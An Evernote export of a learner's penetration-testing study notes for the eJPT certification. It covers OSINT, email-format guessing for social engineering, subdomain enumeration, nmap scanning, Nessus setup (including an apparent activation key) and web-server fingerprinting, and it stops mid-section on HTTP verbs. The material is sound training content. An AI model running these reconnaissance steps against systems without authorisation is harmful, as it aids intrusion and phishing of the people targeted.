<html>
<head>
  <title>Evernote Export</title>
  <basefont face="Segoe UI" size="2" />
  <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
  <meta name="exporter-version" content="Evernote Windows/309091 (en-US, DDL); Windows/10.0.0 (Win64);"/>
  <style>
    body, td {
      font-family: Segoe UI;
      font-size: 10pt;
    }
  </style>
</head>
<body>
<a name="1162"/>

<div>
<span><div><div><b>Introduction</b></div><ul><li><div>Information gathering is the first and most crucial phase of an engagement. </div></li><ul><li><div>Widen the attack surface</div></li><li><div>understand the target orgnaisation</div></li><li><div>mount efficient and targeted attacks</div></li></ul></ul><div><br/></div><div><b>OSINT</b></div><ul><li><div>Why study this?</div></li><ul><li><div>Widening attack surface</div></li><li><div>Mounting targeted attacks</div></li><li><div>Sharpening your tools in preparation for the next phases</div></li></ul><li><div>Where to look?</div></li><ul><li><div>social networks</div></li><li><div>public sites</div></li><li><div>visiting the company websites</div></li></ul><li><div>Social Networks</div></li><ul><li><div>When employees post information about current projects, trips to conferences, phone numbers, emails they are giving a goldmine to criminals. </div></li><li><div>It not only helps criminals to phishing and impersonation attacks but also gives them the means to create a technical map of the systems and technologies used by the company.</div></li><li><div>The same thing can be achieved by pentesters by looking at</div></li><ul><li><div>Facebook</div></li><li><div>Twitter</div></li><li><div>LinkedIn</div></li><li><div>Google+</div></li><ul><li><div>Others may be more specific to a given company i.e marketing company may wanna check instagram. </div></li></ul></ul><li><div>LinkedIn</div></li><ul><li><div>Login </div></li><li><div>Click on the magnifying glass icon for advanced search</div></li><li><div>Go to bottom, All filters</div></li><li><div>Check for phone numbers and/or email addresses that can be exploited to mount social engineering attacks. </div></li></ul><li><div>Many social networks allow users to integrate different accounts. E.g Twitter and LinkedIn accounts are shared and this can be expoited to find missing information. </div></li><ul><li><div>Find their real name from Twitter or something like that.</div></li></ul></ul><li><div>Crunchbase</div></li><ul><li><div>is an IT startup database where you can find detailed information about founders, investors, employees, buyouts and acquisitions. </div></li></ul><li><div>Government sites</div></li><ul><li><div>On the internet you can get a wide array of information about companies that have worked with a government or are currently working with one. </div></li></ul><li><div>Whois</div></li><ul><li><div>Can be used to get information like</div></li><ul><li><div>Owner name</div></li><li><div>Street addresses</div></li><li><div>Email addressses</div></li><li><div>Technical contacts </div></li></ul><li><div>from an internet domain</div></li><li><div>You can query the database by using the whois command in Linux. </div></li></ul><li><div>Finally don't forget about browsing your clients actual website for information about</div></li><ul><li><div>Products</div></li><li><div>Services</div></li><li><div>Technologies</div></li><li><div>Company culture</div></li></ul><li><div>Try to figure out what schema the business is using for their emails, this way with a full name you can predict any employees email address. These can be guessed and tested by just sending an email and seeing if it lands. </div></li><ul><li><div>Collect a reasonable number of employee data</div></li><li><div>Try to construct a few possible email formats and apply them to each name/surname pair</div></li><li><div>Try not to send an email that does not alert potential victims</div></li></ul><li><div>All of this fragmented information can be put together to better understand your client's business. </div></li></ul><div><br/></div><div><br/></div><div><br/></div><div><b>Subdomain Enumeration</b></div><ul><li><div>The most effective way of widening the attack surface is to discover as many websites owned by the company as possible. </div></li><li><div>It is common for websites of the same company to share the same top level domain name</div></li><ul><li><div><a href="http://careers.company.com">careers.company.com</a></div></li><li><div><a href="http://mail.company.com">mail.company.com</a></div></li><li><div><a href="http://business.company.com">business.company.com</a></div></li></ul><li><div>It is very likely that such resources may contain outdated, buggy software, sensitive information or even administrative interfaces that are not secured. </div></li><li><div>In the eJPT we focus on passive subdomain enumeration.  This means we try to identify subdomains without directly interacting with the target but through open sources. </div></li><ul><li><div>This open source could be a search engine. </div></li><li><div>For example </div></li><ul><li><div>While googling is performing its indexing activities, it may index pages that were not meant for indexing. A penetration tester can leverage this to passively identify some target subdomains.</div></li></ul><li><div>How?</div></li><ul><li><div>type 'site: <a href="http://company.com">company.com</a>' </div></li><li><div><a href="http://dnsdumpster.com">dnsdumpster.com</a></div></li><ul><li><div>google + bing + virustotal etc for similar information</div></li></ul><li><div>sublist3r</div></li><ul><li><div>use wisely, it is easily blocked by google as its search engine does not like automated tools. </div></li><li><div>run with -d (domain) it starts searching for subdomains in various sources.</div></li></ul><li><div>crt.sh </div></li><ul><li><div>Caches SSL certificates </div></li><li><div>You can also go to a subdomain, manually inspect a certificate and scroll through to see as much as you can about other subdomains.</div></li></ul></ul><li><div>Automated?</div></li><ul><li><div>sublister </div></li><li><div>amass</div></li><ul><li><div>instructions on how to get it up and running in the subdomain enumeration video in Information Gathering</div></li><li><div>unresolved domain means that a domain was probably cached somewhere but the server is now offline or something like that. </div></li><li><div>Can brute force</div></li><li><div>This si good for finding new subdomains. </div></li></ul></ul></ul></ul><div><br/></div><div><br/></div><div><b>The importance of Information Gathering</b></div><ul><li><div>A strong information gathering phase makes the differences between a good and bad penetration tester.</div></li><li><div>A good pentester spends 90% of their time widening the attack surface because he knows this is what it is all about. The other 10% is just a matter of launching the correct commands eith the appropriate tools with a high success rate. </div></li><li><div>Remember that penetration tests are cyclic. Each time you get deeper inside your client's infrastructure you need to gain more information etc. </div></li><li><div>Your penetration test will be as strong as your weaktest skills so do not underestimate information gathering!</div></li></ul><div><br/></div><div><br/></div><div><b>Subdomain Enumeration Video</b></div><ul><li><div>In bug bounties if you see *.company.com then that means everything is on the cards. </div></li></ul><div><br/></div></div></span>
</div>
<hr>
<a name="1164"/>

<div>
<span><div><div><div><span style="font-weight: bold;">Disclaimer</span></div><ul><li><div>Never run any of these tools and techniques on addresses, machines or networks without proper authorisation.</div></li></ul><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Mapping a network</span></div><ul><li><div>Why?</div></li><ul><li><div>Ability to perform efficient pentests</div></li><li><div>Knowledge of your in-scope target</div></li><li><div>Ability to create a technological map</div></li></ul><li><div>After collecting information about the target during the information gathering stage, a penetration tester proceeds to the <span style="font-weight: bold;">fingerprinting</span> and <span style="font-weight: bold;">enumeration</span> of the nodes running on the clients network;</div></li><ul><li><div>This is the infrastructure part of information gathering. </div></li></ul><li><div>These techniques work on both <span style="font-weight: bold;">local</span> and <span style="font-weight: bold;">remote</span> networks </div></li><li><div>As we know, every host connected to the internet or a private network must have a unique IP which identifies it. </div></li><ul><li><div>How can a pentester determine what hosts in an in-scope network are up and running? Why bother?</div></li></ul><li><div>Let's say that a company asks for a pentest and says that the following address block is considered in scope</div></li><ul><li><div>200.200.0.0/16</div></li></ul><li><div>16-bit-long netmask means that the network could contain 2(16) or 65536 hosts with the IP addresses in the 200.200.0.0 - 200.200.255.255 range. The penteste needs a way to find which of the 65k IPs are assigend to a node. </div></li><li><div>This way we can build a technalogical map of the network so that we can completely change our understanding of it - trying to blindly exploit 65k hosts would be a waste of time. </div></li><li><div><span style="font-weight: bold;">Ping sweeping</span> is how we do this</div></li><ul><li><div>The ping commands works using special ICMP packets and sends an <span style="font-weight: bold;">echo request</span> to a host and if the host replies with <span style="font-weight: bold;">echo reply</span> packets then the host is alive.</div></li><li><div>Ping sweeping automatically performs the same operation to every host in a subnet or IP range, saving you from typing hundreds or thousands of ping commands. </div></li></ul><li><div>In Linux, the <span style="font-weight: bold;">fping</span> is a better tool than the standard ping utility. </div></li><ul><li><div>fping -a -g IPRANGE</div></li><ul><li><div>-a = only alive hosts</div></li><li><div>-g = ping sweep</div></li><li><div>IPRANGE = CIDR notation or by specifying the start and end addresses of the sweep</div></li><ul><li><div>fping -a -g 10.54.12.0/24</div></li><li><div>fping -a -g 10.54.12.0 10.54.12.255</div></li></ul></ul><li><div>when running fping on a LAN that you are connected to, you will get a warning message about offline hosts even if you use the -a option. </div></li><ul><li><div>you can supress those messages by redirecting the process standard error to dev/null</div></li><ul><li><div>2&gt;/dev/null on the end of the command. </div></li></ul></ul></ul><li><div>You can also perform a ping sweep/scan with <span style="font-weight: bold;">nmap</span></div></li><ul><li><div>nmap -sn 200.200.0.0/16</div></li><li><div>nmap -sn 200.200.123.1-12</div></li><li><div>nmap -sn 172.16.12.*</div></li><li><div>nmap -sn 200.200.12-13.*</div></li></ul><li><div>You can also save your host list in a file and use the input list -iL command line switch. </div></li><ul><li><div>nmap -sn -iL hostslist.txt</div></li></ul></ul><div><br/></div><div><br/></div><div><span style="font-weight: bold;">OS Fingerprinting</span></div><ul><li><div>Okay so now you have mapped the network and you have a list of <span style="font-weight: bold;">live hosts</span>. So we know that they have responded to pings but we still dont know what software the hosts are running and what role they have in the network. </div></li><ul><li><div>Are they routers? servers? clients? at this stage we don't know?</div></li></ul><li><div>To transform this list into something more useful we need to know what software (i.e what OS) responded to our probes - this is OS fingerprinting. </div></li><li><div>The fingerprint an OS you have to send network requests to the host and analyse the responses you get back. This works because there are some tiny differences in the network stack implementation of the various OS's. </div></li><ul><li><div>Fingerprinting tools send a series of specially crafted requests to the target hosts.  They then examine every bit of the response, creating a <span style="font-weight: bold;">signature</span> of the host behaviour.  This signature is then compared against a <span style="font-weight: bold;">database</span> of know OS signatures. These are not entirely reliable but supporting them with experience you can get pretty accurate.</div></li></ul><li><div>During a pentest you will need have to perform this reconaissance step of <span style="font-weight: bold;">every network node</span></div></li><ul><li><div>Routers</div></li><li><div>Firewalls</div></li><li><div>Hosts</div></li><li><div>Servers</div></li><li><div>Printers </div></li><li><div>etc etc</div></li><ul><li><div>What you want at the end is a list of IPs, OSs and how confident you are that they are correct.</div></li></ul></ul><li><div>To perform OS fingerprinting with <span style="font-weight: bold;">nmap</span> you have to use the -o switch and specify your targets. We can also use the -Pn switch to skip the ping scan if we already know that the targets are alive</div></li><ul><li><div>nmap -Pn -o &lt;target&gt;</div></li><ul><li><div>within the -o switch there are different levels of aggression of OS detection. </div></li><li><div>You could start by limiting the OS reconaissance to just the promising ones</div></li></ul></ul></ul><div><br/></div><div><span style="font-weight: bold;">nmap OS Fingerprinting video</span></div><ul><li><div>open terminal</div></li><li><div>type nmap -sT (TCP connect scan) -o 192.168.43.0/24</div></li><li><div>If we press the UP arrow key then we can see the progress of the scan</div></li><li><div>if you want to check your own OS type </div></li><ul><li><div>uname -a</div></li><li><div>ver on windows</div></li></ul></ul></div><div><br/></div><div><br/></div><div><br/></div><div><b>Port scanning</b></div><ul><li><div>Why?</div></li><ul><li><div>Prepare for the vulnerability assessment</div></li><li><div>Perform stealth reconaissance</div></li><li><div>Detect firewalls</div></li></ul><li><div>So now we know which nodes and associated OS's are active on the target network. We need a way to discover the daemons and services running on those nodes: <b>PORT SCANNING</b></div></li><ul><li><div>This is a process to determine what TCP and UDP ports are <b>open</b> on target hosts.</div></li><li><div>Moreover it lets you know which daemon, in terms of software and version, is listeining on a specific port. </div></li><li><div>With this you can create a list of potential weaknesses and vulnerabilities to check during the following vulnerability assessment phase. </div></li><ul><li><div>Daemon? piece of software running on a server to provide a given <b>service</b>. A deamon listens on a specific <b>port</b>. </div></li></ul><li><div>The goal of port scanning/service detection is to find the software name and version of the daemons running on each host. </div></li><li><div>Port scanning works similarly to OS fingerprinting by sending probes to the targets and analysing the responses. </div></li><ul><li><div>They can also detect if there is a firewall between you and the target </div></li></ul></ul></ul><div><br/></div><div><br/></div><ul><li><div><b>How does a port scanner work?</b></div></li><ul><li><div><b>TCP</b></div></li><li><div>Remember the TCP three-way handshake?</div></li><ul><li><div>SYN</div></li><li><div>SYN/ACK</div></li><li><div>ACK</div></li></ul><li><div>When  a client wants to connect to  a server it first sends a packet with SYN flag enabled. Server responds with SYN/ACK flags enabled. Finally the client replies by sending a packet with the ACK flag enabled and the data transmission can start. </div></li><li><div>So what happens if a client tries to contact a daemon that is not running or is running on a different port?</div></li><ul><li><div>The server will reply with a packet that has a RST + ACK (reset) flags enabled. </div></li></ul></ul><li><div>The simplest way to performa a port scan is to try to connect to every port.</div></li><ul><li><div>If the scanner receives a RST packet, the port is <b>closed</b></div></li><li><div>If the scanner can complete the 3-way handshake then the port it <b>open</b>. After connecting, the scanner sends an RST packet to the target host to abruptly close the connection. </div></li><ul><li><div>SYN</div></li><li><div>SYN + ACK</div></li><li><div>ACK</div></li><li><div>RST + ACK</div></li></ul></ul><li><div>Now remember, every TCP connect scan probe<b> gets recorded in the daemon logs</b> because from the application point of view the probe looks like a legitimate connection. </div></li><ul><li><div>Sysadmins can easily detectthe scan as they will see a lot of connections to all the services running on a single machine. To prevent that we invented <b>TCP SYN</b> scans. </div></li></ul></ul><div><br/></div><div><br/></div><ul><li><div><b>TCP SYN Scans</b></div></li><ul><li><div>These scans are <b>stealthy</b> by design. </div></li><li><div>With these scans the scanner does not perform a full handshake it just sends a SYN packet and analyses the response. </div></li><ul><li><div>If it receives a RST the port is closed.</div></li><li><div>If the scanner receives an ACK packet then the port is <b>open.</b> After marking the port as open, the scanner sends an <b>RST</b>  packet to the target host to stop the handshake. </div></li></ul></ul></ul><div><br/></div><div><br/></div><div><b>Scanning with nmap</b></div><ul><li><div>nmap syntax is simple yet powerful</div></li><ul><li><div>nmap [scan types] [options] {target}</div></li><li><div>nmap -sS -sV -O -ooscan-limit 192.168.1.0/24</div></li></ul><li><div>The most common scan types used are</div></li><ul><li><div>-sT = TCP connect scan (non-stealthy)</div></li><li><div>-sS = SYN scan (stealth)</div></li><li><div>-sV = version detection scan</div></li></ul><li><div>Version Detection</div></li><ul><li><div>During a version detection scan, nmap performs a TCP connect scan and reads the banner of the daemon, giving us some information about the version being used. </div></li><li><div>If the daemon does not send a banner by itself, nmap sends some probes to understand what the listening application is. </div></li><li><div>Knowledge of the network, OS and daemons are paramount to setup and carry out a successful vulnerability assessment. </div></li></ul><li><div>Specifying targets</div></li><ul><li><div>nmap has a flexible syntax to specify your targets. You can use</div></li><ul><li><div>DNS names</div></li><li><div>IP address lists</div></li><li><div>CIDR notation</div></li><li><div>wildcards</div></li><li><div>ranges</div></li><li><div>octets lists</div></li><li><div>input files</div></li></ul><li><div>Specifying targets by their DNS names is just a matter of writing them on the command line.</div></li><ul><li><div>nmap &lt;scan type&gt; <a href="http://target1.domain.com">target1.domain.com</a> <a href="http://target2.otherdomain.com">target2.otherdomain.com</a> </div></li></ul><li><div>You can also just type in individual IPs</div></li><li><div>Octet lists</div></li><ul><li><div>nmap &lt;scan type&gt; 10.14.33.1,3,17</div></li></ul><li><div>You can combine all of these together if you want</div></li><ul><li><div>nmap &lt;scan&gt; 10.100.45.0/24 200.200.4.1,7,5,99</div></li></ul><li><div>If you have a very long list of targets, writing it on the command line would be impractical</div></li><ul><li><div>As we saw earlier you can instead write them in a file, <b>one per line</b>, and then use the -iL switch</div></li><ul><li><div>nmap &lt;scan type&gt; -iL HostToScan.txt </div></li></ul></ul></ul><li><div>When you specify one or more targets, by default, nmap scans the most common ports used. </div></li><ul><li><div>If you want to specify custom ports, you can use the -p switch </div></li><ul><li><div>nmap -p 21, 22, 139 &lt;target&gt;</div></li><li><div>nmap -p 100-1000 &lt;target&gt;</div></li></ul></ul></ul><div><br/></div><div><br/></div><div><b>Firewall-block network?</b></div><ul><li><div>You might encounter networks that are protected by firewalls and where pings are blocked. </div></li><li><div>It is not uncommon to come across a server that does not respond to pings but has many TCP or UDP ports open</div></li><ul><li><div>When using nmap you can use the -Pn switch to force the scan on such a server. (skip ping sweeping and treat it as alive)</div></li></ul><li><div>We should also be aware that some ports are almost always open on certain systems. If you would like to find an &quot;alive&quot; host you can scan typical ports instead of performing a ping sweep. </div></li><li><div>Here are some of the common ones that are expected to be open so can be used to identify hosts that may not be reachable with a ping</div></li><ul><li><div>22 - SSH</div></li><li><div>80, 443 - HTTP(S)</div></li><li><div>445 - SMB</div></li><li><div>25 - SMTP (mail)</div></li><li><div>21 - FTP</div></li><li><div>137-139 - NetBIOS</div></li><li><div>1433-1434 - MSSQL Database</div></li><li><div>3306 - MySQL Database</div></li><li><div>8080, 8443 - HTTP(S) web server, HTTP proxy</div></li><li><div>UDP 53 - DNS</div></li></ul><li><div>Of these, the 4 most basic TCP ports can be used as indicators</div></li><ul><li><div>22</div></li><ul><li><div>SSH</div></li></ul></ul><ul><li><div>445</div></li><ul><li><div>SMB</div></li></ul><li><div>80</div></li><ul><li><div>HTTP</div></li></ul><li><div>443</div></li><ul><li><div>HTTPS</div></li></ul></ul></ul><div><b><br/></b></div><div><b><br/></b></div><div><b>Spotting a firewall</b></div><ul><li><div>During network reconaissance, it is sometimes difficult to say if a firewall is in place. </div></li><ul><li><div>In general the larger the network the bigger the possibility of some additional network protections and access control mechanisms. </div></li></ul><li><div>That said there are a few ways to identify that a firewall is in place</div></li><ul><li><div>Pay attention to incomplete nmap results. </div></li><li><div>On an open network if a TCP scan succeeded against a well-known service, like a web server, nmap should not have any difficulty in trying to fingerprint it with -sV switch. </div></li><li><div><b>however</b>, you might often see that a version was not recognised regardless of the open http port. Sometimes even the service type is not recognised, in which case you will see <b>&quot;tcpwrapped&quot;</b> means that the TCP handshake was completed withouth receiving any data. </div></li><ul><li><div>This is an indication that something is blocking the connectivity with the target host. </div></li><li><div>Moreover you might want to use nmap &quot;<b>--reason</b>&quot; switch that will show an explanation of why a port is marke open or closed. </div></li><li><div>This may be something like &quot;RST&quot; packet being sent during the TCP handshake in which case something has blocked the connection, probably a firewall. </div></li></ul></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><b>Masscan</b></div><ul><li><div>This was designated to deal with large networks and to scan thousands of IP addresses at once. </div></li><li><div>It's like nmap but faster and less accurated. </div></li><ul><li><div>You could do host discovery with masscan and then coduct a detailed scan with nmap against interesting hosts. </div></li></ul></ul><div><br/></div><div><br/></div><div><b>nmap port scanning video</b></div><ul><li><div>nmap -sn 192.168.102.0/24</div></li><ul><li><div>this brings back hosts, MAC, latency, NIC</div></li></ul><li><div>nmap -sn 192.168.102.0/24 &gt; hosts-up.txt</div></li><li><div>cat hosts-up.txt</div></li><li><div>nmap 192.168.102.138 </div></li><ul><li><div>this shows status, open ports, SYN scan. </div></li></ul><li><div>nmap -sT -p 80 192.168.102.0/24</div></li><ul><li><div>open = nmap can connect</div></li><li><div>closed = nmap cannot connect</div></li><li><div>filtered = nmap unsure, may be a firewall</div></li><ul><li><div>don't give up with filtered. </div></li></ul></ul><li><div>nmap -sS -sV -p 21 192.168.102.135</div></li><ul><li><div>This will show us the version that we have running on that port too. </div></li></ul><li><div>nmap -sS -sV 192.168.102.0/24 </div></li><ul><li><div>lots of info</div></li></ul></ul><div><br/></div><div><b>masscan video</b></div><ul><li><div>much faster so may be better</div></li><li><div>becareful when using it because you may get blocked or bring it down</div></li></ul><div><br/></div></div></span>
</div>
<hr>
<a name="1166"/>

<div>
<span><div><div><br/></div><div><span style="font-weight: bold;">Vulnerability Assessment</span></div><ul><li><div>Why?</div></li><ul><li><div>Identify vulns and security misconfiguration</div></li><li><div>Prepare yourself for exploitation phase</div></li></ul><li><div>Sometimes clients will just ask for a vulnerability assessment instead of a full pentest.  Sometimes people will not know the difference and so you need to help them understand which is better based off of their needs and help them choose.</div></li><li><div>Seeing as it is just a scan of the vulns it is faster and has a lighter load on the infrastructure. In a vulnerability assessment you do not proceed to the exploitation phase. This means that you will not be able to <span style="font-weight: bold;">confirm</span> the vulns by testing them and giving proof of their existence. Moreover you will not be able to <b>cycle</b> (repeat the information gathering phase and fingerprinting/OS scanning) after the exploitation phase either.</div></li><li><div>The timeline for a vuln assessment may look a bit more like this</div></li><ul><li><div>Engagement</div></li><li><div>Information Gathering</div></li><li><div>Footprinting and Scanning</div></li><li><div>Vuln assessment</div></li><li><div>Reporting</div></li></ul></ul><div><br/></div><div><br/></div><div><b>Scanners</b></div><ul><li><div>Like a penetration test it can be carried out both locally and remotely. Checking systems for all known vulns would be infeasible so pentester can use a vuln scanner.</div></li><ul><li><div>Scanners use databses of known vulns and security audits to detect the vulns of a system. They test on </div></li><ul><li><div>Daemons listening on TCP and UDP ports</div></li><li><div>Config files os OS, software, suites, network devices</div></li><li><div>Windows registry entries</div></li></ul><li><div>to try to find vulns and misconfigurations. </div></li><li><div>some of the famous scanners are</div></li><ul><li><div>OpenVAS</div></li><li><div>Nexpose</div></li><li><div>GFI LAN Guard</div></li></ul><li><div>Nessus is one of the most popular vulnerability scanners. </div></li></ul><li><div>If you have a custom application a scanner may not be enough, you have to test it manually. Testing a custom application is very similar to testing a web app. </div></li><li><div>Studying custom applications means</div></li><ul><li><div>Learning and understanding its features</div></li><li><div>Understanding how it exchanges data over the network </div></li><li><div>Understanding how it accesses resource like databses, servers, local/remote files etc</div></li><li><div>Reverse engineering its logic. </div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><b>Nessus</b></div><ul><li><div>Simple yet powerful vuln scanner. It works great on small and large company networks. </div></li><li><div>It has 2 components: client and a server. </div></li><ul><li><div>Client to configure the scans and the server to actually perform the scanning process and report the results back to the client. </div></li><li><div>The client provides you with a web interface to configure scans. </div></li><li><div>Server performs the scans by sending probes to systems and applications, collecting responses and matching them against its vulnerability database. </div></li></ul><li><div>Steps?</div></li><ul><li><div>First you have to determine if the target hosts are alive and which ports are open on them.</div></li><li><div>For every open port found, the vuln scanner will send special probes to determine which application (name and version) is running on them. </div></li><li><div>For each detected service/daemon the scanner queries its database looking for known vulns. </div></li><li><div>Finally, the scanner sends probes to verify if the vuln actually exists - this can cause false positives as some probes could be too mild to effectively identify a real vulnerability. </div></li></ul></ul><div><br/></div><div><br/></div><div><b>Nessus Video</b></div><ul><li><div>You have to download Nessus from tenable website</div></li><li><div>open terminal</div></li><ul><li><div>download the file, cd to where it was downloaded, type</div></li><ul><li><div>dpkg -i + Name of file</div></li><li><div>service nessusd start</div></li><li><div>go to the address it gives </div></li><li><div>use activation: 31A0-31BD-8AAA-060F-F596</div></li></ul><li><div>policies</div></li><ul><li><div>new policy</div></li><li><div>advanced scan</div></li><ul><li><div>give name</div></li></ul><li><div>discovery</div></li><ul><li><div>disable test local nessus host</div></li></ul><li><div>port scanning</div></li><ul><li><div>select TCP</div></li></ul><li><div>Plugins</div></li><ul><li><div>Disable all </div></li><li><div>enable</div></li><ul><li><div>Windows: microsoft bullet</div></li><li><div>Windows</div></li></ul></ul><li><div>Save</div></li></ul><li><div>scan</div></li><ul><li><div>New scan</div></li><li><div>Select policy</div></li><li><div>give name </div></li><li><div>targets</div></li><ul><li><div>input IP</div></li></ul><li><div>Save</div></li></ul><li><div>Double click </div></li><li><div>Look at critical</div></li><li><div>export - HTML - select</div></li></ul></ul><div><br/></div></div></span>
</div>
<hr>
<a name="1168"/>

<div>
<span><div><div><div><span style="font-weight: bold;">Introduction</span></div><ul><li><div>Web apps used different technologies and programming paradigms to desktop applications.</div></li><li><div>Never use this if you don't have permission</div></li></ul><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Web Server Fingerprinting</span></div><ul><li><div>Why?</div></li><ul><li><div>Knowledge of targets</div></li><li><div>Ability to use exploitation tools at their best</div></li><li><div>Ability to search for the right public exploit</div></li></ul><li><div>Web apps often make up the vast majority of the internet-facing attack surface. They run on web servers so <span style="font-weight: bold;">testing if a web sever is secure</span> from external or internal attacks <span style="font-weight: bold;">is crucial.</span></div></li><ul><li><div>Many people tend to overlook web servers security, but a misconfigured web server could be an open door to the whole network.</div></li></ul><li><div>What does fingerprinting a web server mean?</div></li><ul><li><div>The daemon providing the web server service (such as IIS, Apache, nginx)</div></li><li><div>Its version</div></li><li><div>The OS of the machine hosting the server.</div></li></ul><li><div>How do we do this?</div></li><ul><li><div>With tools?</div></li><ul><li><div>Netcat is a very popular tool that is also known as the 'TCP/IP swiss army knife'.</div></li><li><div>It can be used on both a server and a client</div></li><li><div>You can use Netcat as a client to <span style="font-weight: bold;">manually</span> send requests to the server.</div></li><li><div>This is known as <span style="font-weight: bold;">banner grabbing</span></div></li><ul><li><div>To grab a banner you just have to connect to a listening daemon and then read the banner it sends back to your client</div></li></ul><li><div>To connect to an HTTP server you have to pass the destination host and port to Netcat. (most of the time this will be the default HTTP 80)</div></li><ul><li><div>nc &lt;target address&gt; 80</div></li></ul><li><div>After connecting you have to send a <span style="font-weight: bold;">valid</span> <span style="font-weight: bold;">HTTP request</span> which you can do by using the <span style="font-weight: bold;">HEAD</span> HTTP verb.</div></li><ul><li><div>This verb requests the header of a resource (a web page for example)</div></li><li><div>Remember to append 2 empty lines - every HTTP request has 2 empty lines between header and the body of the request itself, so when sending body-less requests like head dont forget to include them</div></li></ul><li><div>As soon as you run netcat it connects to the server and you can send the request message:</div></li><ul><li><div>HEAD / HTTP/1.0</div></li><li><div><br/></div></li><li><div><br/></div></li><ul><li><div>nc &lt;target address&gt; 80</div></li><li><div>HEAD / HTTP/1.0</div></li><li><div><br/></div></li><li><div><br/></div></li></ul></ul><li><div>After sending the 2 empty lines, the target server will process your request and send a response message back.</div></li><ul><li><div>Most of the time the response contains a <span style="font-style: italic;">server:</span> header containing information about the web server and sometimes the server OS</div></li></ul><li><div>Beware of a couple of common mistakes when fingerprinting web servers with netcat</div></li><ul><li><div>You have to write the request in UPPERCASE</div></li><li><div>Netcat does not notify you after the connection to the server, you must write your request after running the command - this can be changed with the -verbose (-v) command line switch.</div></li><li><div>Netcat does not perform any kind of encryption, so you cannot use it to connect to an HTTPS daemon</div></li><ul><li><div>If you try it will just drop after entering your request.</div></li></ul></ul><li><div>What if a webserver only accepts HTTPS connections? You can use the <span style="font-weight: bold;">OpenSSL</span> command line tool.</div></li><ul><li><div>you can establish a connection to an HTTPS server and then send the usual HEAD HTTP verb</div></li><ul><li><div>openssl s_client -connect target.site:443</div></li><li><div>HEAD /HTTP/1.0</div></li></ul></ul></ul><li><div>When performing fingerprinting, remember that sysadmins can customise web server banners to make fingerprinting more difficult.</div></li><ul><li><div>Automatic tools go beyond banner grabbing. They fingerprint web servers by checking implementation-dependent details such as</div></li><ul><li><div>Headers ordering in response messages</div></li><li><div>Errors handling</div></li></ul><li><div><span style="font-weight: bold;">httprint</span> is a web server fingerprinting tool that uses a <span style="font-weight: bold;">signature-based technique</span> to identify web servers.</div></li><ul><li><div>httprint -P0 -h &lt;target hosts&gt; -s &lt;signature file&gt;</div></li><ul><li><div>-p0 is to avoid pinging the host (most web servers do not respond to ping echo requests)</div></li><li><div>-h &lt;target hosts&gt; tells the tool to fingerprint a list of hosts. You can also provide a range of IPs</div></li><li><div>-s is the signature file to use. You have to specify this</div></li></ul></ul></ul></ul></ul><div><br/></div><div><span style="font-weight: bold;">HTTP Verbs</span></div><ul><li><div>why?</div></li><ul><li><div>ability to manually exploit a misconfigured web server</div></li><li><div>the covered attacks can also be used against embedded devices</div></li><li><div>ability to create a custom PHP shell</div></li></ul><li><div>The common HTTP verbs are</div></li><ul><li><div>GET</div></li><li><div>POST</div></li><li><div>HEAD</div></li><li><div>PUT</div></li><li><div>DELETE</div></li></ul><li><div><span style="font-weight: bold;">GET</span></div></li><ul><li><div>used to request a resource.</div></li><ul><li><div>When a user wants to open a web page, the browser sends a GET request.</div></li><ul><li><div>GET /page.php HTTP/1.1</div></li><li><div>Host: <a href="http://www.example.site/">www.example.site</a></div></li></ul></ul><li><div>GET can also be used to pass <span style="font-weight: bold;">arguments</span> to the web application.</div></li><ul><li><div>To pass &quot;courses=PTS&quot; to the &quot;page.php&quot; the request will be</div></li><ul><li><div>GET /page.php?course=PTS HTTP/1.1</div></li><li><div>Host: <a href="http://www.example.site/">www.example.site</a></div></li></ul></ul></ul><li><div><span style="font-weight: bold;">POST</span></div></li><ul><li><div>Post is used to submit HTML form data.</div></li><ul><li><div>POST parameters must used in the message body.</div></li><ul><li><div>POST /login.php HTTP/1.1</div></li><li><div>Host: <a href="http://www.example.site/">www.example.sit</a>e</div></li><li><div><br/></div></li><li><div><br/></div></li><li><div>username=john&amp;password=mypass</div></li></ul></ul></ul><li><div><span style="font-weight: bold;">HEAD</span></div></li><ul><li><div>As we saw previously, HEAD is very similar to GET as it asks just headers of the response instead of the response body.</div></li><ul><li><div>HEAD / HTTP/1.1</div></li><li><div>Host: <a href="http://www.example.site/">www.example.site</a></div></li></ul></ul><li><div><span style="font-weight: bold;">PUT</span></div></li><ul><li><div>PUT is used to upload a file to the server.</div></li><ul><li><div>As you can imagine if it is left misconfigured it is very dangerous</div></li><ul><li><div>PUT /path/to/destination HTTP/1.1</div></li><li><div>Host: <a href="http://www.example.site/">www.example.site</a></div></li><li><div><br/></div></li><li><div><br/></div></li><li><div>&lt;PUT data&gt;</div></li></ul></ul></ul><li><div><span style="font-weight: bold;">DELETE</span></div></li><ul><li><div>DELETE is used to remove a file from the server</div></li><ul><li><div>this is another feature that must be configured wisely as a misused DELETE leads to DoS and data loss</div></li><ul><li><div>DELETE /path/to/destination HTTP/1.1</div></li><li><div>Host: <a href="http://www.example.site/">www.example.site</a></div></li></ul></ul></ul><li><div><span style="font-weight: bold;">OPTIONS</span></div></li><ul><li><div>OPTIONS is used to query the web server for enabled HTTP verbs</div></li><ul><li><div>OPTIONS / HTTP/1.1</div></li><li><div>Host: <a href="http://www.example.site/">www.example.site</a></div></li></ul></ul><li><div><span style="font-weight: bold;">REST APIs</span></div></li><ul><li><div>Representational State Transfer Application Programming Interface</div></li><ul><li><div>They are a specific type of webapp that relies strongly on almost all HTTP verbs</div></li><li><div>They are often referred to as &quot;web services&quot; or &quot;APIs&quot;</div></li></ul><li><div>Because they rely heavily on all HTTP verbs, you can expect them to have subverted functionality.</div></li><ul><li><div>It is common for such applications to use &quot;PUT&quot; for saving <span style="font-weight: bold;">data</span> and not for saving files</div></li><li><div>Before you include that you found a PUT/DELETE during a pentest report you should comfirm its exact impact. It is sometimes easy to confuse REST APIs PUT method (which simply creates new content) with PUT method that allows us to create an arbitrary file.</div></li><li><div>How do you test this?</div></li><ul><li><div>After issuing a PUT request, you should try to look for the existence of the file you created.</div></li></ul></ul></ul><li><div>If you are using HTTP/1.1 you need to include the <span style="font-weight: bold;">Host:</span> in the header request too. If you use HTTP1.0 you can skip the host header.</div></li><ul><li><div>Sometimes enabled HTTP verbs depend on the hostname you are 